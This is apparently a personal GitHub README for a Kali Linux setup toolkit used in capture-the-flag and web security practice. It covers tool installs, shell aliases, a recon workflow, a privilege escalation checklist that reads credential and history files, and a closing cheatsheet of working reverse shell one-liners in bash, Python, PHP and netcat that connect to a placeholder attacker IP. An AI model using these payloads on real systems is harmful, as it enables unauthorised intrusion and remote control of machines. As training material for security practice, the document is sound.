# ⚙️ Kali Linux Setup Toolkit

My personal Kali Linux environment setup — tools, aliases, wordlists, and workspace structure I use for web security testing and CTF work. Built to go from a fresh Kali install to a fully operational hacking environment fast.

---

## Quick Start

```bash
git clone https://github.com/Sayrex01/kali-setup-toolkit
cd kali-setup-toolkit
chmod +x setup.sh
./setup.sh
```

---

## Workspace Structure

```
~/hacking/
├── targets/          # One folder per target/room
│   └── target-name/
│       ├── nmap/     # Scan outputs
│       ├── gobuster/ # Directory brute results
│       ├── burp/     # Burp project files
│       └── notes.md  # Live notes per target
├── tools/            # Custom scripts
├── wordlists/        # Symlinked from /usr/share/seclists
└── loot/             # Captured flags, hashes, credentials
```

### Initialize workspace
```bash
mkdir -p ~/hacking/{tools,loot}
mkdir -p ~/hacking/targets/example/{nmap,gobuster,burp}
```

---

## Tools Installed

### Core
```bash
sudo apt update && sudo apt install -y \
  nmap \
  gobuster \
  feroxbuster \
  ffuf \
  nikto \
  wireshark \
  enum4linux-ng \
  evil-winrm \
  seclists \
  wordlists \
  curl \
  jq \
  git \
  python3-pip \
  net-tools
```

### Python tools
```bash
pip3 install requests beautifulsoup4 pwntools impacket
```

### Wordlists — update symlinks
```bash
# SecLists
ls /usr/share/seclists/

# Rockyou (make sure it's decompressed)
gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
ls /usr/share/wordlists/rockyou.txt
```

---

## Shell Aliases (`~/.bashrc` / `~/.zshrc`)

```bash
# ── Navigation ──────────────────────────────────────────
alias h='cd ~/hacking'
alias t='cd ~/hacking/targets'

# ── Nmap shortcuts ──────────────────────────────────────
alias nmap-quick='nmap -T4 -F'
alias nmap-full='nmap -sV -sC -p- -T4 -oA'
alias nmap-udp='sudo nmap -sU -T4 --top-ports 100'
alias nmap-vuln='nmap --script vuln -oA'

# ── Web fuzz shortcuts ──────────────────────────────────
alias gob='gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt'
alias gob-small='gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt'
alias ffuf-params='ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt'

# ── Target init ─────────────────────────────────────────
mktarget() {
  mkdir -p ~/hacking/targets/$1/{nmap,gobuster,burp}
  echo "# $1" > ~/hacking/targets/$1/notes.md
  echo "## Date: $(date)" >> ~/hacking/targets/$1/notes.md
  echo "## Target IP: " >> ~/hacking/targets/$1/notes.md
  echo "" >> ~/hacking/targets/$1/notes.md
  echo "## Ports" >> ~/hacking/targets/$1/notes.md
  echo "" >> ~/hacking/targets/$1/notes.md
  echo "## Web" >> ~/hacking/targets/$1/notes.md
  cd ~/hacking/targets/$1
  echo "[+] Target directory created: ~/hacking/targets/$1"
}

# ── Misc ────────────────────────────────────────────────
alias myip='curl -s ifconfig.me'
alias ports='ss -tulnp'
alias please='sudo $(history -p !!)'
```

Apply:
```bash
source ~/.bashrc
```

---

## Standard Recon Flow

### 1. New target — init directory
```bash
mktarget machine-name
export IP=10.10.10.X
```

### 2. Nmap
```bash
# Quick initial scan
nmap-quick $IP

# Full thorough scan (save output)
nmap -sV -sC -p- -T4 -oA nmap/full $IP
```

### 3. Web — if port 80/443 open
```bash
# Directory brute
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js -o gobuster/dirs.txt

# Recursive with feroxbuster
feroxbuster --url http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html -o gobuster/ferox.txt

# Parameter fuzzing (after finding a page)
ffuf -u http://$IP/page?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs [baseline_size]
```

### 4. SMB — if port 445 open
```bash
enum4linux-ng -A $IP
smbclient -L //$IP -N
smbclient //$IP/share -N
```

### 5. Notes template (`notes.md`)
```markdown
# Target Name
## Date: YYYY-MM-DD
## IP: 10.10.10.X

## Open Ports
- 22/ssh — OpenSSH x.x
- 80/http — Apache x.x
- 445/smb

## Web Findings
- /admin — login page
- /uploads — file upload (potential vector)

## Credentials Found
- admin:password123

## Exploitation Path
1. Found SQLi in /login
2. Extracted creds from users table
3. SSH with found credentials
4. Priv esc via sudo -l → /bin/bash

## Flag
User: THM{...}
Root: THM{...}
```

---

## Privilege Escalation Checklist

```bash
# Basic enumeration
sudo -l                          # what can we run as sudo?
id                               # groups?
cat /etc/passwd | grep sh        # other users with shell
find / -perm -4000 2>/dev/null   # SUID binaries

# Writable files/dirs
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Interesting files
cat /etc/passwd
cat ~/.bash_history
find / -name "*.txt" 2>/dev/null | grep -i pass
find / -name "config*" 2>/dev/null
```

GTFOBins reference: https://gtfobins.github.io

---

## Reverse Shell Cheatsheet

```bash
# Listener (always run first)
nc -lvnp 4444

# Bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (if -e available)
nc -e /bin/sh YOUR_IP 4444

# Upgrade shell after getting it
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg → Enter
```

---

*By [Ilyass Benfdil](https://github.com/Sayrex01) · TryHackMe Top 6%*
